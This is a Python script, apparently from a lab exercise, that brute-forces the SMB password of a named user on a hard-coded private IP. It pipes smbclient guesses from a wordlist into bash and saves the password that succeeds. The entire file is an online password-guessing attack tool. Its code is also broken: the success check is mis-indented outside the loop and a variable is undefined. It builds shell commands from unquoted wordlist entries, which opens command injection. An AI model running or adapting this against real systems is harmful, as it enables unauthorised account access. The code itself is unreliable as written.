#!/usr/bin/env python

# coding=utf-8

from subprocess import Popen, PIPE, check_output

p = 1
USERNAME = "sigurdkb"
IP = "172.16.0.30"
PORT = "445"
new_results = []
correct_pw = ""
cracked = bool(False)
counter = 0
guess_result = ((),)
pw = ''

def connect_smb():
 global correct_pw
 global cracked
 global guess_result
 global pw 

 while cracked == False:
  pw = get_next_pw()
  
  arg = 'smbclient //'+IP+'/homes -U '+USERNAME+' '+pw
  proc = Popen('/bin/bash', stdin=PIPE, stdout=PIPE) 
  stdout = proc.communicate(arg.encode())
  guess_result = stdout
  print ("Try: " + pw ) 
if b'Welcome' in guess_result:
   print ("Correct password: " + pw)
   correct_pw = pw
   f = open("correct_pw.txt", 'w')
   
   f.write(correct_pw)
   cracked = True
else:
   print ("Tried: " + pw)


def get_next_pw():
 global counter
 global filenr
 
  f = open("wl.txt", 'r')
 l = f.readlines()[counter]
 if l == '':
  print ("wordlist_part"+ str(filenr) + " er ferdig")
  exit(0)
 else:
  l =  'f'+l
  counter += 1
  return l.strip('\n')

connect_smb()
